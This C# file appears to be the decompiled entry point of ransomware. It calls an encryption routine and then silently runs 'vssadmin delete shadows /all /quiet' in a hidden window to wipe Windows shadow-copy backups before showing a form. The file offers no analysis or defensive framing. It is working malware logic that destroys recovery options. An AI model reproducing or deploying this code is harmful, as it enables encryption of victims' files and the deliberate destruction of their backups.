using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace SF;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		SF.Main.RunEncrypt();
		DeleteShadowCopy();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(defaultValue: false);
		Application.Run(new link2());
	}

	private static void DeleteShadowCopy()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process process = new Process
			{
				StartInfo = startInfo
			};
			process.Start();
		}
		catch (Exception)
		{
		}
	}
}
